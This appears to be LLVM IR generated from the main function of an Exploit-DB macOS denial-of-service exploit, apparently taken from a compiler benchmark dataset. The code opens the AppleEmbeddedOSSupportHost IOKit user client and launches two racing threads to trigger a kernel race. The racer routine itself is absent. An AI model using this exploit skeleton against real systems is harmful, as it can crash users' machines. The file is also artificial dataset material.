; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44007.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/macos/dos/extr_44007.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [27 x i8] c"AppleEmbeddedOSSupportHost\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@conn = common dso_local global i32 0, align 4
@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@racer = common dso_local global i32 0, align 4
@start = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i64, align 8
  %3 = alloca i64, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %10 = load i32, i32* @kIOMasterPortDefault, align 4
  %11 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0))
  %12 = call i64 @IOServiceGetMatchingService(i32 %10, i32 %11)
  store i64 %12, i64* %3, align 8
  %13 = load i64, i64* %3, align 8
  %14 = load i64, i64* @IO_OBJECT_NULL, align 8
  %15 = icmp eq i64 %13, %14
  br i1 %15, label %16, label %18

16:                                               ; preds = %0
  %17 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %66

18:                                               ; preds = %0
  %19 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %19, i32* @conn, align 4
  %20 = load i64, i64* %3, align 8
  %21 = call i32 (...) @mach_task_self()
  %22 = call i64 @IOServiceOpen(i64 %20, i32 %21, i32 0, i32* @conn)
  store i64 %22, i64* %2, align 8
  %23 = load i64, i64* %2, align 8
  %24 = load i64, i64* @KERN_SUCCESS, align 8
  %25 = icmp ne i64 %23, %24
  br i1 %25, label %26, label %28

26:                                               ; preds = %18
  %27 = call i32 @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.2, i64 0, i64 0))
  store i32 0, i32* %1, align 4
  br label %66

28:                                               ; preds = %18
  %29 = call i32 (...) @q()
  store i32 %29, i32* %4, align 4
  %30 = load i32, i32* @conn, align 4
  %31 = load i32, i32* %4, align 4
  %32 = call i32 @IOConnectSetNotificationPort(i32 %30, i32 0, i32 %31, i32 0)
  store i32 2, i32* %5, align 4
  %33 = load i32, i32* %5, align 4
  %34 = zext i32 %33 to i64
  %35 = call i8* @llvm.stacksave()
  store i8* %35, i8** %6, align 8
  %36 = alloca i32, i64 %34, align 16
  store i64 %34, i64* %7, align 8
  store i32 0, i32* %8, align 4
  br label %37

37:                                               ; preds = %47, %28
  %38 = load i32, i32* %8, align 4
  %39 = load i32, i32* %5, align 4
  %40 = icmp slt i32 %38, %39
  br i1 %40, label %41, label %50

41:                                               ; preds = %37
  %42 = load i32, i32* %8, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds i32, i32* %36, i64 %43
  %45 = load i32, i32* @racer, align 4
  %46 = call i32 @pthread_create(i32* %44, i32* null, i32 %45, i32* null)
  br label %47

47:                                               ; preds = %41
  %48 = load i32, i32* %8, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %8, align 4
  br label %37

50:                                               ; preds = %37
  store i32 1, i32* @start, align 4
  store i32 0, i32* %9, align 4
  br label %51

51:                                               ; preds = %61, %50
  %52 = load i32, i32* %9, align 4
  %53 = load i32, i32* %5, align 4
  %54 = icmp slt i32 %52, %53
  br i1 %54, label %55, label %64

55:                                               ; preds = %51
  %56 = load i32, i32* %9, align 4
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i32, i32* %36, i64 %57
  %59 = load i32, i32* %58, align 4
  %60 = call i32 @pthread_join(i32 %59, i32* null)
  br label %61

61:                                               ; preds = %55
  %62 = load i32, i32* %9, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %9, align 4
  br label %51

64:                                               ; preds = %51
  store i32 0, i32* %1, align 4
  %65 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %65)
  br label %66

66:                                               ; preds = %64, %26, %16
  %67 = load i32, i32* %1, align 4
  ret i32 %67
}

declare dso_local i64 @IOServiceGetMatchingService(i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @q(...) #1

declare dso_local i32 @IOConnectSetNotificationPort(i32, i32, i32, i32) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i32, i32*) #1

declare dso_local i32 @pthread_join(i32, i32*) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
